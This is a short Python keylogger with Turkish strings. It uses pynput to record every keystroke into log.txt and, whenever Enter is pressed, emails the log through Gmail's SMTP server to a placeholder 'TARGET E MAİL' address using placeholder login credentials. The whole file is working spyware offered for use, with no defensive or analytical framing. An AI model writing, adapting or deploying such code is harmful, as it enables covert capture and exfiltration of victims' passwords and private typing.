import pynput
import smtplib


from pynput.keyboard import Key,Listener




count = 0
keys = []

def on_press(key):
    global count,keys
    count += 1
    print("{0} basıldı".format(key))
    keys.append(key)

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt" , "a" , encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    if key == Key.enter:
        from email.mime.text import MIMEText
        with open('log.txt') as fp:

            msg = MIMEText(fp.read())


        msg['Subject'] = 'Log Kayıtları -> {}'.format("log.txt")
        msg['From'] = "YOUR E-MAİL"
        msg['To'] = "TARGET E MAİL"


        s = smtplib.SMTP("smtp.gmail.com",587)
        s.ehlo()
        s.starttls()
        s.login("YOUR E-MAİL. NO USE @GMAİL.COM","jYOUR PASS")
        s.send_message(msg)
        s.quit()


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
